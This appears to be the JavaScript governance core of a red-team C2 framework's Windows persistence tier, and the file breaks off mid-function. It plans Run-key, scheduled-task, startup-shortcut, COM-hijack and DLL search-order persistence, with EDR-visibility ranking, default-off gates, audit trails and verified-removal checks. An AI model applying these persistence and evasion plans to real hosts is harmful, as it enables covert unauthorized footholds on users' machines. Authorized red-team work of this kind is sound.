// VARVEL — the GOVERNED PERSISTENCE TIER (roadmap #8): governance core.
//
// Standard red-team persistence for the Windows range agent — the capability every
// serious C2 ships (CS persistence kits, Mythic modules) — built the VARVEL way:
// default-OFF, double-gated, fully audited, and with MANDATORY CLEANUP-PROOF. The
// signature doctrine, enforced in code:
//
//   PERSISTENCE THAT CANNOT PROVE ITS OWN REMOVAL NEVER INSTALLS.
//
// Mechanically that means: install() snapshots the PRE-INSTALL state FIRST (never write
// what you cannot put back — the same cleanup doctrine as the evasion tier's byte
// snapshot), refuses to clobber a FOREIGN value unless the operator passed overwrite AND
// the old value is journaled for restore-on-remove, and PROVES the write by re-read.
// remove() executes and then VERIFIES absence (re-read the key/task/lnk — a removal
// that cannot verify is a LOUD failure, escalated to the operator, never a quiet lie).
// The engagement sweep ('persist-audit') lists every installed persistence and its
// verified-removal status; assessEngagementClean() refuses to call an engagement
// 'clean' while unverified persistence exists.
//
// Stage-1 scope (Windows, USER-LAND ONLY — the honest boundary, stated plainly):
//   runkey  — HKCU\Software\Microsoft\Windows\CurrentVersion\Run value (user-context)
//   schtask — a user-context scheduled task (on-logon trigger, Interactive principal,
//             RunLevel Limited — NOT elevated)
//   startup — a shell:startup folder .lnk via WScript.Shell COM (user-context)
//
// Stage-2 scope (DEEP PERSISTENCE — quieter user-land techniques, chosen EDR-aware):
//   comhijack — a user-context COM hijack: HKCU\Software\Classes\CLSID\{...}\
//               InprocServer32 (Default) pointed at our payload DLL. No admin, no HKLM
//               write: the per-user classes hive shadows machine registrations for THIS
//               user's processes. The candidate CLSID is CLASSIFIED before any write
//               (classifyComCandidate): 'safe-abandoned' (registered nowhere — alters no
//               working app; the honest trigger tension: it is quiet BECAUSE nothing
//               uses it) vs 'shadow' (an HKLM registration exists — the user hijack
//               SHADOWS it, altering the host app's behavior: higher impact, flagged
//               loudly in evidence + audit) vs 'occupied-user' (a foreign user-context
//               registration — never clobbered silently). TRIGGER MODEL, honestly: the
//               payload loads WHEN ANY user-context process instantiates the CLSID —
//               opportunistic, NOT a guaranteed timer. persist-status with prove:true
//               runs a BENIGN resolve-proof (a throwaway child instantiates the CLSID:
//               the hijack provably resolves — or honestly doesn't — and the child is
//               confirmed to EXIT cleanly).
//   dllsearch — DLL search-order persistence = the execproxy tier's sideload plant
//               (REUSED: EXECPROXY_REGISTRY.sideload.plan derives the file set — copy a
//               signed host into the governed dir, write our DLL beside it under the
//               hijacked name; copies only, never in place, never beside the original)
//               PLUS a classic persist trigger (runkey/schtask) pointing at the COPY.
//               The plant leg inherits execproxy's discipline verbatim (foreign bytes
//               are a loud refused-clobber — files are never journaled/overwritten) and
//               the trigger leg inherits the classic registry discipline (foreign values
//               journal + restore on remove). Removal disarms the trigger FIRST, then
//               deletes only hash-matching plants, then the plant dir.
// CONSIDERED AND SKIPPED (documented, not pretended): Winlogon Shell/Userinit overrides
// (HKCU\...\Winlogon) — SYSTEM-adjacent: they execute inside the logon path, are among
// the most EDR-instrumented user-hive values on a hardened box, and a bad write breaks
// the user's own shell — a governability hazard the cleanup doctrine will not accept
// blind. The standing boundary is unchanged: NO kernel, NO services-as-SYSTEM, NO WMI
// event subscriptions, NO HKLM/machine-wide hives. Everything here runs with exactly
// the privileges the agent already has — persistence, never privilege escalation.
//
// EDR-AWARE SELECTION (rankPersistTechniques): every technique carries a STATIC
// telemetry profile (PERSIST_TELEMETRY — which event IDs / log sources an INSTALL
// produces: Security 4657 registry-value-set, 4698 task-created, Sysmon 12/13/11,
// TaskScheduler/Operational 106, Defender behavior watches). Given the target's
// MEASURED posture (edrview: which logs actually answer — Sysmon presence above all;
// rangehard: Defender behavior/RTP state, ASR summary; the selector's own probe:
// audit-policy subcategories + SACL readability), the selector ranks classic + deep
// techniques by PREDICTED VISIBILITY — preferring techniques whose install-time
// signals the current target does not collect (no Sysmon ⇒ registry-only techniques
// rank higher). VERDICT PHRASING INHERITS THE HONESTY CONTRACT: 'lower predicted
// visibility against the measured posture', NEVER 'undetectable'.
//
// THE RELAUNCH LINE IS CAPTURED AGENT-SIDE (never shipped by the channel): the agent
// builds the exact command that relaunches ITSELF (its own binary/script path + its own
// launch args) at install time; the channel-side spec names only techniques + an
// optional name + the overwrite flag. Audit carries the sha256 of the target line
// (targetSha256), never a channel-injected command. The line embeds the agent's
// callback token — the locations are USER-CONTEXT and user-readable by construction
// (HKCU, the user's own tasks, the user's own Startup folder): same privilege class as
// the agent itself, stated honestly in docs/AGENT-GUIDE.md.
//
// Governance (three seams, all fail-closed — mirrors engine/evasion.mjs):
//   1. ENGAGEMENT GATE — settings key 'persist.enabled' (default OFF). The channel
//      refuses to queue persist-* unless the engagement explicitly enabled it; the agent
//      must ALSO have been launched with its own persist flag (-AllowPersist /
//      --persist 1). Refusals are loud and audited (task.refused), never silent drops.
//   2. SPEC GATE — the task data must parse: known kind, known techniques, deduped,
//      capped; remove requires an explicit scope (techniques OR all:true). Refused
//      BEFORE queueing.
//   3. AUDIT — a queued persist task emits 'persist.task' with the sha256 of the
//      normalized SPEC (specSha256 pins exactly what was ordered). When the agent's
//      result arrives, the intake emits 'persist.installed' / 'persist.removed' /
//      'persist.remove-failed' (escalated) / 'persist.status' / 'persist.sweep'
//      carrying per-technique location + targetSha256 + the verification booleans —
//      the accountability trail (what was written where, provably, and that it was
//      provably taken back).

import { createHash } from 'node:crypto';
import { Settings } from './settings.mjs';
import { EXECPROXY_HIJACK_NAMES, EXECPROXY_REGISTRY } from './execproxy.mjs';

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');

export const PERSIST_KIND_INSTALL = 'persist-install';
export const PERSIST_KIND_STATUS = 'persist-status';
export const PERSIST_KIND_REMOVE = 'persist-remove';
export const PERSIST_KIND_AUDIT = 'persist-audit';
export const PERSIST_KINDS = new Set([PERSIST_KIND_INSTALL, PERSIST_KIND_STATUS, PERSIST_KIND_REMOVE, PERSIST_KIND_AUDIT]);
export const PERSIST_TECHNIQUES = ['runkey', 'schtask', 'startup'];
// DEEP PERSISTENCE (stage 2): user-land still — see the header. comhijack and dllsearch
// carry per-install parameters (a CLSID + payload DLL; a signed host + hijack name +
// trigger), so an install spec names AT MOST ONE deep technique and never mixes deep
// with classic in one install (each deep install is a deliberate, parameterized op —
// the spec gate enforces it pre-queue).
export const PERSIST_DEEP_TECHNIQUES = ['comhijack', 'dllsearch'];
export const PERSIST_ALL_TECHNIQUES = [...PERSIST_TECHNIQUES, ...PERSIST_DEEP_TECHNIQUES];

// The canonical user-land locations (stage 1). The <tag> is the operator-visible name
// handle: 'VARVEL-<sha8>' by default (derived agent-side from the agent's identity), or
// an operator-chosen name from the install spec. Every location is user-context only.
export const PERSIST_RUNKEY_PATH = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
export const PERSIST_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$/;

// DEEP locations (stage 2). The COM hijack lives in the per-user classes hive — the
// InprocServer32 (Default) value under a chosen CLSID. dllsearch's trigger reuses the
// classic runkey/schtask locations (pointing at the COPIED host); its plants live in
// the governed dir (the agent sandbox), derived exactly like the execproxy sideload.
export const PERSIST_COM_ROOT = 'HKCU\\Software\\Classes\\CLSID';
export const PERSIST_CLSID_RE = /^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$/;
export const PERSIST_DLLSEARCH_TRIGGERS = ['runkey', 'schtask'];

export function persistTag(seed) {
  return 'VARVEL-' + sha256(String(seed ?? '')).slice(0, 8);
}

// Canonical location string for audit + the manifest (the PS side resolves %STARTUP%
// to the real per-user path in ITS evidence; the shape is identical). DEEP techniques
// are parameter-derived (a CLSID, a plant dir) — persistLocation refuses them loudly;
// use deepPersistPlan.
export function persistLocation(technique, tag) {
  switch (technique) {
    case 'runkey': return PERSIST_RUNKEY_PATH + '\\' + tag;
    case 'schtask': return '\\' + tag; // Task Scheduler root folder, user-context task
    case 'startup': return '%STARTUP%\\' + tag + '.lnk';
    default:
      if (PERSIST_DEEP_TECHNIQUES.includes(technique)) {
        throw new TypeError('persistLocation: deep technique ' + JSON.stringify(technique) + ' locations are parameter-derived (a CLSID / a governed plant dir), not name-derived — use deepPersistPlan(technique, deep, tag)');
      }
      throw new TypeError('persist: unknown technique ' + JSON.stringify(technique));
  }
}

// The COM hijack location: the InprocServer32 (Default) value of the chosen CLSID in
// the PER-USER classes hive. The registry value written there is the payload DLL path.
export function comHijackLocation(clsid) {
  return PERSIST_COM_ROOT + '\\' + String(clsid || '').toUpperCase() + '\\InprocServer32';
}

// The dllsearch plan — the execproxy tier's sideload machinery REUSED verbatim for the
// plant set (copy the signed host into the governed dir, write our DLL beside it under
// the hijacked name: copies only, never in place, never beside the original), PLUS a
// classic persist trigger pointing at the COPY. Pure: paths + shapes only.
export function dllSearchPlan({ host, as, dll, trigger = 'runkey', tag, sandbox = '%SANDBOX%' } = {}) {
  const plantDir = String(sandbox).replace(/[\\/]+$/, '') + '\\persist-dllsearch-' + tag;
  const hostBase = String(host || '').split(/[\\/]/).pop();
  // THE REUSE: the exact file set the execproxy sideload registry derives.
  const side = EXECPROXY_REGISTRY.sideload.plan({ dll, host, as, plantDir });
  const hostCopy = plantDir + '\\' + hostBase;
  const targetLine = '"' + hostCopy + '"'; // the trigger's launch line: the COPY, quoted
  // the trigger arrives as a name from a spec, or as the journaled object from a
  // manifest entry — normalize to the name.
  const trigTech = typeof trigger === 'object' && trigger !== null ? String(trigger.technique || 'runkey') : String(trigger || 'runkey');
  return {
    technique: 'dllsearch', plantDir, hostBase, hostCopy,
    dllAs: plantDir + '\\' + String(as || '').toLowerCase(),
    files: side.files, // [{role:'host-copy',path,copyFrom},{role:'dll-as',path,copyFrom},{role:'payload',path}]
    trigger: { technique: trigTech, location: persistLocation(trigTech, tag), value: targetLine },
  };
}

const ABS_WIN_PATH_RE = /^([A-Za-z]:\\|\\\\|%[A-Za-z]+%\\)/; // drive / UNC / %ENV%-rooted
function validDeepPath(p, what, suffixRe) {
  const s = String(p || '').trim();
  if (!s) throw new TypeError(what + ' is required (an absolute path on the range host)');
  if (s.length > 260) throw new RangeError(what + ' exceeds the 260-char path cap');
  if (!ABS_WIN_PATH_RE.test(s)) throw new TypeError(what + ' must be an ABSOLUTE Windows path (drive, UNC, or %ENV%-rooted): ' + JSON.stringify(s.slice(0, 60)));
  if (s.includes('..')) throw new TypeError(what + ' must not contain ".." — deep-persist paths stay inside the governed sandbox');
  if (suffixRe && !suffixRe.test(s)) throw new TypeError(what + ' must end in ' + suffixRe + ': ' + JSON.stringify(s.slice(-40)));
  return s;
}

// The PRIMARY (display/audit-key) location of a deep technique: the hijacked
// InprocServer32 value for comhijack; the trigger location for dllsearch (its plant
// files ride the manifest entry's deep.files list).
export function deepPrimaryLocation(technique, deep, tag, sandbox = '%SANDBOX%') {
  if (technique === 'comhijack') return comHijackLocation(deep && deep.clsid);
  if (technique === 'dllsearch') return dllSearchPlan({ ...(deep || {}), tag, sandbox }).trigger.location;
  throw new TypeError('deepPrimaryLocation: unknown deep technique ' + JSON.stringify(technique));
}

// The manifest entry key for a deep technique. comhijack keys PER-CLSID — several
// hijacks coexist under one agent name handle ('comhijack-<clsid8>'); dllsearch keys
// per technique (its plant dir + trigger are name-derived, so one plant per handle,
// exactly like a classic technique).
export function deepEntryKey(technique, deep) {
  if (technique === 'comhijack') return 'comhijack-' + String((deep && deep.clsid) || '').toUpperCase().replace(/[{}-]/g, '').slice(0, 8);
  if (PERSIST_DEEP_TECHNIQUES.includes(technique)) return technique;
  throw new TypeError('deepEntryKey: unknown deep technique ' + JSON.stringify(technique));
}

// The BASE technique of an entry/result key: deep comhijack keys are per-CLSID
// ('comhijack-<clsid8>'). Engagement tracking (assessEngagementClean) keys on base
// technique + location — the location already disambiguates coexisting hijacks.
export function baseTechnique(name) {
  const n = String(name || '');
  return n.startsWith('comhijack-') ? 'comhijack' : n;
}

// Validate + normalize the deep params of a spec. THROWS (TypeError/RangeError) with a
// loud, operator-readable reason. Pure.
export function parseDeepParams(technique, deep, k) {
  if (!deep || typeof deep !== 'object' || Array.isArray(deep)) {
    throw new TypeError(k + ': deep technique ' + JSON.stringify(technique) + ' needs a "deep" params object (' + (technique === 'comhijack' ? '{"clsid":"{GUID}","dll":"C:\\\\...\\\\payload.dll"}' : '{"host":"C:\\\\...\\\\signed.exe","as":"version.dll","dll":"C:\\\\...\\\\payload.dll","trigger":"runkey"}') + ')');
  }
  if (technique === 'comhijack') {
    const clsid = String(deep.clsid || '').trim().toUpperCase();
    if (!PERSIST_CLSID_RE.test(clsid)) throw new TypeError(k + ': deep.clsid ' + JSON.stringify(deep.clsid) + ' is not a CLSID (want ' + PERSIST_CLSID_RE + ')');
    const dll = validDeepPath(deep.dll, k + ': deep.dll', /\.dll$/i);
    return { technique, clsid, dll };
  }
  if (technique === 'dllsearch') {
    const host = validDeepPath(deep.host, k + ': deep.host', /\.exe$/i);
    const dll = validDeepPath(deep.dll, k + ': deep.dll', /\.dll$/i);
    const as = String(deep.as || '').toLowerCase().trim();
    if (!EXECPROXY_HIJACK_NAMES.includes(as)) throw new TypeError(k + ': deep.as must be one of ' + EXECPROXY_HIJACK_NAMES.join(', ') + ' (the execproxy stage-1 search-order allowlist — the same names, reused)');
    const trigger = deep.trigger === undefined || deep.trigger === null || String(deep.trigger).trim() === '' ? 'runkey' : String(deep.trigger).toLowerCase().trim();
    if (!PERSIST_DLLSEARCH_TRIGGERS.includes(trigger)) throw new TypeError(k + ': deep.trigger must be one of ' + PERSIST_DLLSEARCH_TRIGGERS.join(', ') + ' (a startup-.lnk trigger for a copied host is NOT shipped — the classic trigger set only)');
    return { technique, host, dll, as, trigger };
  }
  throw new TypeError(k + ': unknown deep technique ' + JSON.stringify(technique));
}

// ——— COM candidate classification (shadow-vs-safe) ———
// The pre-install classifier. Inputs are PROBE FACTS (agent-measured, or fixture in
// tests): hklm/hkcu = { present:boolean, value:string|null } — the InprocServer32
// (Default) of the CLSID in each hive — or null when that hive was not probed.
//   safe-abandoned — registered in NEITHER hive: the user-context registration alters
//                    NO working application (instantiation previously failed with
//                    REGDB_E_CLASSNOTREG). HONEST TRIGGER TENSION: it is quiet BECAUSE
//                    nothing uses it — the trigger is opportunistic, never a timer.
//   shadow         — an HKLM registration exists: the user hijack SHADOWS the machine
//                    class for THIS user's processes — host apps that instantiate it
//                    now load OUR server: HIGHER IMPACT, flagged loudly. Removal simply
//                    un-shadows (HKLM is never written).
//   occupied-user  — an HKCU registration already exists: foreign unless value-
//                    identified as ours — the standard clobber-refusal/journal applies.
//   unknown        — a hive went unprobed: never guess (fail-closed honest).
export function classifyComCandidate({ clsid, hklm = null, hkcu = null, ourValue = null } = {}) {
  const c = String(clsid || '').trim().toUpperCase();
  if (!PERSIST_CLSID_RE.test(c)) throw new TypeError('classifyComCandidate: clsid ' + JSON.stringify(clsid) + ' is not a CLSID');
  if (hklm == null || hkcu == null) {
    return { clsid: c, classification: 'unknown', shadow: false, ours: false, impact: 'unprobed hive(s) — the candidate was NOT classified (fail-closed: never guess impact)', note: 'probe both HKLM and HKCU InprocServer32 registrations before any install decision' };
  }
  if (hkcu.present === true) {
    const ours = ourValue != null && String(hkcu.value) === String(ourValue);
    return {
      clsid: c, classification: 'occupied-user', shadow: false, ours,
      impact: 'a user-context registration already exists for this CLSID — a FOREIGN one is never clobbered silently (refuse, or overwrite:true journals it and restore-on-remove puts it back)',
      note: ours ? 'the existing registration is value-identified as OURS — idempotent re-verify' : 'the existing registration is foreign — governed clobber rules apply',
    };
  }
  if (hklm.present === true) {
    return {
      clsid: c, classification: 'shadow', shadow: true, ours: false,
      impact: 'SHADOWS the machine-wide (HKLM) registration for THIS user — processes of this user that instantiate the class load OUR server instead of the real one: the host application\'s behavior changes. HIGHER IMPACT — flagged loudly in evidence and audit; removal un-shadows (HKLM is never touched)',
      note: 'a predictable trigger (whatever instantiates the class in this user\'s processes) at the cost of altering host behavior — the honest trade-off, stated',
    };
  }
  return {
    clsid: c, classification: 'safe-abandoned', shadow: false, ours: false,
    impact: 'no HKLM/HKCU registration exists — a user-context registration alters NO working application (instantiation previously failed with REGDB_E_CLASSNOTREG)',
    note: 'HONEST TRIGGER TENSION: a genuinely abandoned class may be instantiated rarely — it is quiet BECAUSE nothing uses it; the trigger is opportunistic, not a guaranteed timer',
  };
}

// ——— TRIGGER MODELS (status carries one per technique, always) ———
export const PERSIST_TRIGGER_MODELS = {
  runkey: 'fires at the NEXT interactive logon of this user (explorer processes the Run value) — guaranteed at next logon',
  schtask: 'fires at the next interactive logon of this user (Task Scheduler on-logon trigger, Interactive principal, RunLevel Limited) — guaranteed at next logon, scheduler-mediated',
  startup: 'fires at the next interactive logon of this user (explorer processes shell:startup) — guaranteed at next logon',
  comhijack: 'fires WHEN ANY user-context process calls CoCreateInstance/CreateObject on the hijacked CLSID — opportunistic, NOT a guaranteed timer: cadence depends entirely on what instantiates the class (a shadowed in-use class fires with its host app; an abandoned class may fire rarely — that is exactly why it is quiet)',
  dllsearch: 'fires at the next interactive logon of this user via the classic trigger (runkey/schtask) pointing at the COPIED signed host; the copy then search-order-loads our DLL from its own directory — guaranteed at next logon, two-stage',
};

// The sha256 of the normalized spec — pinned into 'persist.task' at queue time (what
// was ordered, provably). Deep params are normalized by shape (clsid uppercased; paths
// case-folded — the CONTENT hash is evidenced agent-side at install and lands in the
// intake events).
export function persistSpecSha256(spec) {
  return sha256(JSON.stringify({
    kind: spec.kind, techniques: spec.techniques || null,
    name: spec.name || null, overwrite: spec.overwrite === true, all: spec.all === true,
    deep: spec.deep ? {
      technique: spec.deep.technique, clsid: spec.deep.clsid ? String(spec.deep.clsid).toUpperCase() : null,
      dll: spec.deep.dll ? String(spec.deep.dll).toLowerCase() : null,
      host: spec.deep.host ? String(spec.deep.host).toLowerCase() : null,
      as: spec.deep.as ? String(spec.deep.as).toLowerCase() : null,
      trigger: spec.deep.trigger || null,
    } : null,
  }));
}

// Parse + validate a persist task-data string for the given kind. THROWS
// (TypeError/RangeError) with a loud, operator-readable reason. Pure: no I/O, no
// settings — the same parse runs server-side (pre-queue refusal) and agent-side
// (pre-execution refusal).
export function parsePersistSpec(kind, data) {
  kind = String(kind || '');
  if (!PERSIST_KINDS.has(kind)) throw new TypeError('persist: unknown kind ' + JSON.stringify(kind) + ' (want one of ' + [...PERSIST_KINDS].join(', ') + ')');
  const raw = String(data ?? '').trim();
  const techniquesFrom = (spec, k) => {
    if (!Array.isArray(spec.techniques)) throw new TypeError(k + ': techniques must be an array (subset of ' + PERSIST_ALL_TECHNIQUES.join(', ') + ')');
    const techniques = [...new Set(spec.techniques.map((t) => String(t).toLowerCase().trim()))];
    if (!techniques.length) throw new TypeError(k + ': techniques is empty — nothing to do');
    if (techniques.length > PERSIST_ALL_TECHNIQUES.length) throw new RangeError(k + ': ' + techniques.length + ' techniques is over the ' + PERSIST_ALL_TECHNIQUES.length + ' cap');
    for (const t of techniques) {
      if (!PERSIST_ALL_TECHNIQUES.includes(t)) throw new TypeError(k + ': unknown technique ' + JSON.stringify(t) + ' (the tier ships ' + PERSIST_TECHNIQUES.join(', ') + ' + deep ' + PERSIST_DEEP_TECHNIQUES.join(', ') + ' — Windows user-land: registry Run-key, user-context scheduled task, startup-folder shortcut, user-context COM hijack, governed-dir search-order plant; no kernel, no SYSTEM services, no WMI subscriptions, no HKLM hives)');
    }
    return techniques;
  };
  // Deep-technique constraints (enforced pre-queue AND pre-exec): a deep install is ONE
  // parameterized op — never mixed with classic, never two deep techniques at once.
  const deepFrom = (spec, k, techniques, { requireParams }) => {
    const deepTechs = (techniques || []).filter((t) => PERSIST_DEEP_TECHNIQUES.includes(t));
    if (deepTechs.length && techniques.length > 1) {
      throw new TypeError(k + ': a deep technique (' + deepTechs.join(', ') + ') installs ALONE — one deliberate parameterized op per task; no mixing with classic techniques or a second deep technique');
    }
    if (spec.deep !== undefined && !deepTechs.length) throw new TypeError(k + ': "deep" params require a deep technique (' + PERSIST_DEEP_TECHNIQUES.join(', ') + ') in techniques');
    if (deepTechs.length === 1 && (requireParams || spec.deep !== undefined)) return parseDeepParams(deepTechs[0], spec.deep, k);
    return null;
  };
  const parseObj = (k) => {
    let spec;
    try { spec = JSON.parse(raw); } catch {
      throw new TypeError(k + ': task data is not valid JSON (want {"techniques":["runkey","schtask","startup"]})');
    }
    if (!spec || typeof spec !== 'object' || Array.isArray(spec)) throw new TypeError(k + ': task data must be a JSON object');
    return spec;
  };
  const nameFrom = (spec, k) => {
    if (spec.name === undefined || spec.name === null || String(spec.name).trim() === '') return null;
    const name = String(spec.name).trim();
    if (!PERSIST_NAME_RE.test(name)) throw new TypeError(k + ': name ' + JSON.stringify(name) + ' is not a safe persistence handle (want ' + PERSIST_NAME_RE + ' — it becomes the Run-value / task / .lnk base name / plant-dir suffix)');
    return name;
  };
  const proveFrom = (spec, k, techniques) => {
    const prove = spec.prove === true;
    if (spec.prove !== undefined && typeof spec.prove !== 'boolean') throw new TypeError(k + ': prove must be a boolean when given (true = run the benign local trigger proof where the technique has one)');
    if (prove && Array.isArray(techniques) && techniques.length && !techniques.includes('comhijack')) {
      throw new TypeError(k + ': prove applies to comhijack (the throwaway-child CLSID resolve-proof) — dllsearch\'s benign proof is the live file/trigger integrity re-read status already performs; the classic techniques\' trigger is next-logon (no on-demand proof)');
    }
    return prove;
  };
  if (kind === PERSIST_KIND_AUDIT) {
    if (raw && raw !== '{}') throw new TypeError('persist-audit takes no task data (got ' + raw.slice(0, 40) + ')');
    return { kind, techniques: null };
  }
  if (kind === PERSIST_KIND_STATUS) {
    if (!raw || raw === '{}') return { kind, techniques: null, name: null }; // all installed / all known
    const spec = parseObj(kind);
    const name = nameFrom(spec, kind);
    if (spec.techniques === undefined) {
      const out = { kind, techniques: null, name };
      if (spec.deep !== undefined) throw new TypeError(kind + ': "deep" params require a deep technique (' + PERSIST_DEEP_TECHNIQUES.join(', ') + ') in techniques');
      if (spec.prove === true) out.prove = true; // prove-all: applies to installed comhijack entries
      return out;
    }
    const techniques = techniquesFrom(spec, kind);
    const out = { kind, techniques, name };
    const deep = deepFrom(spec, kind, techniques, { requireParams: false });
    if (deep) out.deep = deep; // locate a never-installed deep technique (no manifest entry)
    if (proveFrom(spec, kind, techniques)) out.prove = true;
    return out;
  }
  if (kind === PERSIST_KIND_REMOVE) {
    if (!raw || raw === '{}') throw new TypeError('persist-remove needs an explicit scope: {"techniques":[...]} or {"all":true} — removal is never ambiguous');
    const spec = parseObj(kind);
    const all = spec.all === true;
    const hasTech = spec.techniques !== undefined;
    if (all && hasTech) throw new TypeError('persist-remove: give techniques OR all:true, not both — the removal scope must be unambiguous');
    if (!all && !hasTech) throw new TypeError('persist-remove needs an explicit scope: {"techniques":[...]} or {"all":true}');
    if (all) {
      if (spec.deep !== undefined) throw new TypeError(kind + ': "deep" params are meaningless with all:true (the manifest carries every installed entry\'s params)');
      return { kind, techniques: null, all: true, name: nameFrom(spec, kind) };
    }
    const techniques = techniquesFrom(spec, kind);
    const out = { kind, techniques, all: false, name: nameFrom(spec, kind) };
    const deep = deepFrom(spec, kind, techniques, { requireParams: false });
    if (deep) out.deep = deep;
    return out;
  }
  // persist-install
  const spec = parseObj(kind);
  const techniques = techniquesFrom(spec, kind);
  const name = nameFrom(spec, kind);
  if (spec.overwrite !== undefined && typeof spec.overwrite !== 'boolean') throw new TypeError(kind + ': overwrite must be a boolean when given (true = journal the existing value and replace it; the journal restores it on remove)');
  if (spec.prove !== undefined) throw new TypeError(kind + ': prove is a persist-status flag (the benign resolve-proof runs against an INSTALLED hijack), not an install flag');
  const out = { kind, techniques, name, overwrite: spec.overwrite === true };
  const deep = deepFrom(spec, kind, techniques, { requireParams: true });
  if (deep) out.deep = deep;
  return out;
}

// The engagement gate. Returns { ok: true } or { ok: false, reason } — fail-CLOSED on
// any settings-layer error (a gate that cannot read its setting does not install).
export function persistGate(engagement) {
  let on = false;
  try { on = Settings.for(engagement || 'default').get('persist.enabled') === true; } catch { on = false; }
  if (!on) {
    return {
      ok: false,
      reason: "engagement setting 'persist.enabled' is OFF — the persistence tier is disabled. "
        + "An operator must explicitly enable it for engagement '" + (engagement || 'default') + "' "
        + "(POST /api/settings {key:'persist.enabled', value:true}) before persist tasks will queue, and the agent must "
        + "have been launched with its own persist flag. Nothing installed.",
    };
  }
  return { ok: true };
}

// ——— PersistStore ———
// The PURE state-machine twin of the agent-side machinery (the ==PERSIST-LIB== block in
// agents/persist-host.ps1 / agents/varvel-agent.ps1 does the identical dance against the
// real registry / Task Scheduler / Startup folder), run over an INJECTED backend so the
// cleanup-proof contract is pinned hermetically: snapshot-first, clobber-refusal with
// journal, install verified by re-read, removal verified by re-read, verify-failure LOUD.
//
// backend = {
//   probe(location) -> { present:boolean, value:string|null }  // value = the stored command line
//   apply(location, target) -> void                            // create-or-overwrite
//   remove(location) -> void                                   // delete
//   — DEEP techniques additionally need (fail loudly when absent):
//   probeFile(path) -> { present:boolean, sha256:string|null } // re-read + hash (payload/host evidence, plant verify)
//   plantFile(path, copyFrom) -> void                          // copy copyFrom -> path (dllsearch plants)
//   removeFile(path) -> void                                   // delete ONE planted file
//   removeDir(path) -> void                                    // delete the (empty) plant dir (best-effort)
//   probeClsid(clsid) -> { hklm:{present,value}|null, hkcu:{present,value}|null }  // candidate classification facts
// }
// A test backend is a Map; the real backend is Windows itself, driven by the PS twin.
export class PersistStore {
  constructor({ backend, tag, target, sandbox, now } = {}) {
    if (!backend || typeof backend.probe !== 'function' || typeof backend.apply !== 'function' || typeof backend.remove !== 'function') {
      throw new TypeError('PersistStore needs an injected backend { probe, apply, remove } — the real registry/scheduler is NEVER touched from Node');
    }
    if (!tag || !PERSIST_NAME_RE.test(String(tag))) throw new TypeError('PersistStore needs a valid tag (the Run-value / task / .lnk base name)');
    if (!target || !String(target).trim()) throw new TypeError('PersistStore needs the target relaunch line (captured agent-side at install — the same agent, same config)');
    this.backend = backend;
    this.tag = String(tag);
    this.target = String(target);
    this.targetSha256 = sha256(this.target);
    this.sandbox = String(sandbox || '%SANDBOX%'); // display-only: the PS twin resolves the REAL governed dir from the manifest path
    this._now = typeof now === 'function' ? now : () => new Date().toISOString();
    this.manifest = { version: 1, tag: this.tag, target: this.target, targetSha256: this.targetSha256, createdAt: this._now(), entries: {} };
  }

  _evidence(technique, deep) {
    const ev = {
      state: 'failed', technique,
      location: deep ? deepPrimaryLocation(technique, deep, this.tag, this.sandbox) : persistLocation(technique, this.tag),
      target: this.target, targetSha256: this.targetSha256,
      preExisted: false, overwriteJournaled: false,
      installVerified: null, removalVerified: null, journalRestored: null,
      note: null, error: null,
    };
    if (deep) {
      // Deep evidence ALWAYS carries the trigger model (what event loads us) — stated,
      // never implied. Plus the per-technique deep fields.
      ev.triggerModel = PERSIST_TRIGGER_MODELS[technique];
      if (technique === 'comhijack') {
        ev.clsid = deep.clsid; ev.dll = deep.dll;
        // The hijack value IS the payload path — an InprocServer32 (Default) holds a
        // DLL, never the agent relaunch line (that line is the classic techniques'
        // target; a COM registration has no command line).
        ev.target = deep.dll; ev.targetSha256 = sha256(deep.dll);
        ev.classification = null; ev.shadow = false; ev.dllSha256 = null; ev.resolveProof = null;
      } else if (technique === 'dllsearch') {
        const plan = dllSearchPlan({ ...deep, tag: this.tag, sandbox: this.sandbox });
        ev.host = deep.host; ev.as = deep.as; ev.dll = deep.dll;
        ev.plantDir = plan.plantDir;
        ev.trigger = { technique: plan.trigger.technique, location: plan.trigger.location };
        ev.dllSha256 = null; ev.hostSha256 = null; ev.files = [];
      }
    }
    return ev;
  }

  // The deep params an op resolves: the job's params win; the MANIFEST's recorded
  // params are the fallback (a relaunched agent may not re-derive them — the manifest
  // is the source of truth for what was installed). Without params the first recorded
  // entry of the technique answers (the PS twin expands ALL of them per job; the pure
  // twin models one).
  _deepFor(technique, deep) {
    if (deep) return deep;
    for (const e of Object.values(this.manifest.entries)) {
      if (e && e.technique === technique && e.deep) return e.deep;
    }
    return null;
  }

  _entryFor(technique, deep) {
    return this.manifest.entries[deepEntryKey(technique, deep)] || null;
  }

  // install(): pre-install snapshot FIRST; foreign values are never clobbered silently
  // (refuse, or journal-then-replace when the operator passed overwrite); the write is
  // PROVEN by re-read. Returns the per-technique evidence object (never throws on a
  // governed refusal; backend faults land as state 'failed' with the error).
  install(technique, { overwrite = false, deep = null } = {}) {
    if (!PERSIST_ALL_TECHNIQUES.includes(technique)) throw new TypeError('persist-install: unknown technique ' + JSON.stringify(technique));
    if (PERSIST_DEEP_TECHNIQUES.includes(technique)) {
      const d = this._deepFor(technique, deep);
      if (!d) throw new TypeError('persist-install: deep technique ' + JSON.stringify(technique) + ' needs its params (the spec gate enforces this pre-queue — a direct store call must pass { deep })');
      return technique === 'comhijack' ? this._installComHijack(d, { overwrite }) : this._installDllSearch(d, { overwrite });
    }
    const ev = this._evidence(technique);
    let pre;
    try { pre = this.backend.probe(ev.location); } catch (e) {
      ev.error = 'pre-install probe failed: ' + ((e && e.message) || e) + ' — nothing written (cleanup doctrine: no snapshot, no write)';
      return ev;
    }
    pre = pre || { present: false, value: null };
    ev.preExisted = pre.present === true;
    if (pre.present && pre.value === this.target) {
      // Idempotent re-verify: already installed and intact — nothing rewritten.
      ev.state = 'installed'; ev.installVerified = true;
      ev.note = 'already installed and intact (live re-read matches the target line) — idempotent no-op';
      this._recordEntry(technique, ev, { present: true, value: null, valueSha256: null }, false);
      return ev;
    }
    if (pre.present && !overwrite) {
      ev.state = 'refused-clobber';
